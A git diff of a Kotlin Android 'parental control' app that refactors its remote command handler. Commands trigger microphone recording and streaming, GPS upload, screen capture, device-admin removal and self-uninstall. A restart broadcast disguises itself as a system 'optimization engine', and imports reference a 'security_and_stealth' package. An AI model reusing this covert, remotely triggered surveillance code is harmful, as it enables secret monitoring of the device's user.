@@ -1,38 +1,37 @@
-package com.example.parentalcontrol
+package com.example.parentalcontrol.features.remote_commands.controllers
 
 import android.content.Context
+import android.content.Intent
+import android.media.AudioManager
 import android.media.MediaPlayer
 import android.media.RingtoneManager
+import android.net.Uri
+import android.os.Build
+import android.provider.Settings
 import android.util.Log
-import io.github.jan.supabase.postgrest.postgrest
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.serialization.json.JsonElement
+import kotlinx.serialization.json.JsonObject
+import kotlinx.serialization.json.JsonPrimitive
+import com.example.parentalcontrol.AppUpdateManager
+import com.example.parentalcontrol.features.service_watchdog.services.MonitoringForegroundService
+import com.example.parentalcontrol.ParentalControlManager
 import com.example.parentalcontrol.features.location_tracking.services.GpsTracker
 import com.example.parentalcontrol.features.audio_recording.services.AudioRecorderEngine
 import com.example.parentalcontrol.features.audio_recording.controllers.MicManager
 import com.example.parentalcontrol.features.screen_capture.services.ScreenCaptureEngine
-import kotlinx.serialization.Serializable
-
-@Serializable
-data class CommandRecord(
-    val id: String,
-    val device_id: String,
-    val command: String,
-    val status: String,
-    val payload: kotlinx.serialization.json.JsonElement? = null, // JSONB from Supabase
-    val created_at: String? = null,
-    val executed_at: String? = null
-)
-
-
+import com.example.parentalcontrol.features.security_and_stealth.controllers.MyDeviceAdminReceiver
+import com.example.parentalcontrol.features.remote_commands.services.RemoteConfigManager
+import com.example.parentalcontrol.features.remote_commands.services.SupabaseManager
 
 /**
- * مدير الأوامر (Command Manager)
- * متصل بنظام السحب الدوري (Polling) كبديل فائق الاستقرار للأسلاك (Websockets) لمنع حالات الفشل
+ * منفذ وموجه أوامر التحكم عن بُعد (Command Action Executor)
+ * يوجه كل أمر إلى الحزمة والخدمة المسؤولة عنه بدقة وأمان
  */
-class RealtimeCommandManager(
+class CommandActionExecutor(
     private val context: Context,
     private val scope: CoroutineScope,
     private val gpsTracker: GpsTracker,
@@ -40,8 +39,7 @@ class RealtimeCommandManager(
 ) {
 
     companion object {
-        private const val TAG = "CommandManager"
-        private const val TABLE_NAME = "commands"
+        private const val TAG = "CommandActionExecutor"
     }
 
     private val supabase = SupabaseManager.getInstance()
@@ -51,77 +49,7 @@ class RealtimeCommandManager(
     private val micManager = MicManager(context, scope)
     private val updateManager = AppUpdateManager(context)
 
-    /**
-     * بدء السحب الدوري للأوامر (كل 5 ثوانٍ)
-     */
-    fun startListening() {
-        Log.i(TAG, "Starting command polling...")
-        scope.launch(Dispatchers.IO) {
-            while (true) {
-                try {
-                    val client = supabase.getClient()
-                    if (client != null) {
-                        val currentDeviceId = android.provider.Settings.Secure.getString(
-                            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
-                        )
-
-                        // نجلب الأوامر المعلقة لهذا الجهاز
-                        val newCommands = try {
-                            client.postgrest[TABLE_NAME]
-                                .select {
-                                    filter {
-                                        eq("device_id", currentDeviceId)
-                                        eq("status", "PENDING")
-                                    }
-                                }.decodeList<CommandRecord>()
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Serialization error fetching commands: ${e.message}")
-                            SupabaseManager.getInstance().logRemote(context, TAG, "ERROR", 
-                                "Command Serialization Error: ${e.message}")
-                            emptyList<CommandRecord>()
-                        }
-
-
-                        // تنفيذ الأوامر المكتشفة
-                        for (cmd in newCommands) {
-                            try {
-                                Log.i(TAG, "New command detected: ${cmd.command}")
-                                supabase.logRemote(context, TAG, "INFO", "Executing command: ${cmd.command}")
-                                
-                                val success = executeCommand(cmd.command.uppercase().trim(), cmd.payload)
-
-                                
-                                // تحديث الحالة إلى منفذ (أو فشل) بعد المحاولة
-                                val statusResult = if (success) "EXECUTED" else "FAILED"
-                                
-                                client.postgrest[TABLE_NAME].update(
-                                    {
-                                        set("status", statusResult)
-                                        set("executed_at", kotlinx.datetime.Clock.System.now().toString())
-                                    }
-                                ) {
-                                    filter { eq("id", cmd.id) }
-                                }
-
-                                supabase.logRemote(context, TAG, "INFO", "Command ${cmd.command} result: $statusResult")
-                            } catch (e: Exception) {
-                                Log.e(TAG, "Failed to process command ${cmd.id}: ${e.message}")
-                                supabase.logRemote(context, TAG, "ERROR", "Process failed: ${e.message}")
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Polling error: ${e.message}")
-                }
-                
-                // انتظار 5 ثوانٍ قبل الفحص التالي
-                delay(5000L)
-            }
-        }
-    }
-
-    private suspend fun executeCommand(command: String, payloadJson: kotlinx.serialization.json.JsonElement?): Boolean {
-
+    suspend fun execute(command: String, payloadJson: JsonElement?): Boolean {
         return try {
             when (command) {
                 "LOCK" -> {
@@ -148,9 +76,9 @@ class RealtimeCommandManager(
                 }
                 "RECORD" -> {
                     val duration = try {
-                        if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                        if (payloadJson is JsonObject) {
                             payloadJson["duration"]?.let {
-                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
+                                if (it is JsonPrimitive) it.content.toLong() else it.toString().toLong()
                             } ?: 120_000L
                         } else {
                             120_000L
@@ -181,19 +109,16 @@ class RealtimeCommandManager(
                     true
                 }
                 "LISTEN_STOP" -> {
-                    // إيقاف التسجيل المفتوح إن وجد عبر محرك التسجيل في الخدمة
                     Log.i(TAG, "LISTEN_STOP: (open-ended stop not implemented in service mode)")
                     true
                 }
-                // ── Hybrid Mic (v18.2) ────────────────────────────────────
                 "MIC" -> {
-                    // Parse payload for action
                     val action = try {
-                        val actionValue = if (payloadJson is kotlinx.serialization.json.JsonPrimitive) {
+                        val actionValue = if (payloadJson is JsonPrimitive) {
                             payloadJson.content
-                        } else if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                        } else if (payloadJson is JsonObject) {
                             payloadJson["action"]?.let {
-                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content else it.toString()
+                                if (it is JsonPrimitive) it.content else it.toString()
                             }
                         } else {
                             null
@@ -201,9 +126,8 @@ class RealtimeCommandManager(
                         actionValue ?: "START"
                     } catch (e: Exception) { "START" }
 
-
-                    val deviceId = android.provider.Settings.Secure.getString(
-                        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                    val deviceId = Settings.Secure.getString(
+                        context.contentResolver, Settings.Secure.ANDROID_ID
                     ) ?: "unknown"
 
                     if (action == "START" || action == "MIC_STREAM") {
@@ -214,8 +138,8 @@ class RealtimeCommandManager(
                     true
                 }
                 "MIC_STREAM" -> {
-                    val deviceId = android.provider.Settings.Secure.getString(
-                        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                    val deviceId = Settings.Secure.getString(
+                        context.contentResolver, Settings.Secure.ANDROID_ID
                     ) ?: "unknown"
                     micManager.startStream(deviceId)
                     true
@@ -225,11 +149,10 @@ class RealtimeCommandManager(
                     true
                 }
                 "MIC_RECORD" -> {
-                    // استخراج المدة من الـ payload أولاً (مستقلاً عن حالة الخدمة)
                     val duration = try {
-                        if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                        if (payloadJson is JsonObject) {
                             payloadJson["duration"]?.let {
-                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
+                                if (it is JsonPrimitive) it.content.toLong() else it.toString().toLong()
                             } ?: 60_000L
                         } else {
                             60_000L
@@ -238,12 +161,10 @@ class RealtimeCommandManager(
 
                     val service = MonitoringForegroundService.getInstance()
                     if (service != null) {
-                        // المسار الأساسي: عبر الخدمة (bypassVad=true دائماً للتسجيل اليدوي)
                         service.startManualMic(duration, bypassVad = true)
                         supabase.logRemote(context, TAG, "INFO", "MIC_RECORD: started via Service for ${duration / 1000}s")
                         true
                     } else {
-                        // المسار البديل: الخدمة غير موجودة → نستدعي micManager مباشرة
                         Log.w(TAG, "MIC_RECORD: Service instance NULL — falling back to micManager.recordClip()")
                         supabase.logRemote(context, TAG, "WARN", "MIC_RECORD: Service NULL, using micManager fallback for ${duration / 1000}s")
                         micManager.recordClip(duration, bypassVad = true)
@@ -256,16 +177,13 @@ class RealtimeCommandManager(
                     supabase.logRemote(context, TAG, "INFO", "CANCEL_RECORDING: active recording cancelled")
                     true
                 }
-
                 "LOCATE" -> {
                     gpsTracker.fetchAndUploadLocation(forceUpload = true)
                     true
                 }
                 "UNINSTALL" -> {
-                    // محاولة إلغاء تثبيت التطبيق نفسه عن بُعد
                     supabase.logRemote(context, TAG, "INFO", "UNINSTALL command received — attempting self-uninstall")
                     try {
-                        // إذا كان device admin مفعلاً → إلغاء صلاحيات المدير أولاً ثم الحذف
                         val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                         val adminReceiver = android.content.ComponentName(context, MyDeviceAdminReceiver::class.java)
                         if (dpm.isAdminActive(adminReceiver)) {
@@ -274,17 +192,15 @@ class RealtimeCommandManager(
                     } catch (e: Exception) {
                         Log.w(TAG, "Admin removal failed: ${e.message}")
                     }
-                    // فتح واجهة إلغاء التثبيت
-                    val intent = android.content.Intent(android.content.Intent.ACTION_DELETE).apply {
-                        data = android.net.Uri.parse("package:${context.packageName}")
-                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    val intent = Intent(Intent.ACTION_DELETE).apply {
+                        data = Uri.parse("package:${context.packageName}")
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     }
                     context.startActivity(intent)
                     true
                 }
                 "RESTART" -> {
-                    // إرسال broadcast لإعادة تشغيل الخدمة عبر ServiceRestartReceiver
-                    val restartIntent = android.content.Intent("com.android.system.optimization.engine.RESTART")
+                    val restartIntent = Intent("com.android.system.optimization.engine.RESTART")
                     restartIntent.setPackage(context.packageName)
                     context.sendBroadcast(restartIntent)
                     supabase.logRemote(context, TAG, "INFO", "RESTART command: broadcast sent to ServiceRestartReceiver")
@@ -292,9 +208,9 @@ class RealtimeCommandManager(
                 }
                 "START_AUTO_RECORD" -> {
                     val intervalMs = try {
-                        if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                        if (payloadJson is JsonObject) {
                             payloadJson["interval_ms"]?.let {
-                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
+                                if (it is JsonPrimitive) it.content.toLong() else it.toString().toLong()
                             } ?: 5_000L
                         } else {
                             5_000L
@@ -325,8 +241,6 @@ class RealtimeCommandManager(
                     }
                 }
                 "UPDATE" -> {
-                    // executeCommand هي suspend fun تعمل داخل Dispatchers.IO
-                    // → نستدعي مباشرة بدون launch داخلي لتجنب CancellationException
                     val settings = RemoteConfigManager(context).fetchSettings()
                     if (settings != null) {
                         updateManager.checkAndExecuteUpdate(
@@ -357,17 +271,16 @@ class RealtimeCommandManager(
      */
     private fun playAlarm() {
         try {
-            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-            // رفع الصوت إلى الحد الأقصى تلقائياً (قناة الإنذار)
-            val maxVolume = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM)
-            audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, maxVolume, 0)
+            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
+            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVolume, 0)
 
             val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) ?: 
                                RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
             
             val mediaPlayer = MediaPlayer().apply {
                 setDataSource(context, notification)
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                     setAudioAttributes(
                         android.media.AudioAttributes.Builder()
                             .setUsage(android.media.AudioAttributes.USAGE_ALARM)
@@ -375,14 +288,14 @@ class RealtimeCommandManager(
                             .build()
                     )
                 } else {
-                    setAudioStreamType(android.media.AudioManager.STREAM_ALARM)
+                    @Suppress("DEPRECATION")
+                    setAudioStreamType(AudioManager.STREAM_ALARM)
                 }
                 prepare()
                 isLooping = true
                 start()
             }
 
-            // التوقف بعد 15 ثانية لضمان عدم استهلاك البطارية
             scope.launch {
                 delay(15000L)
                 try {
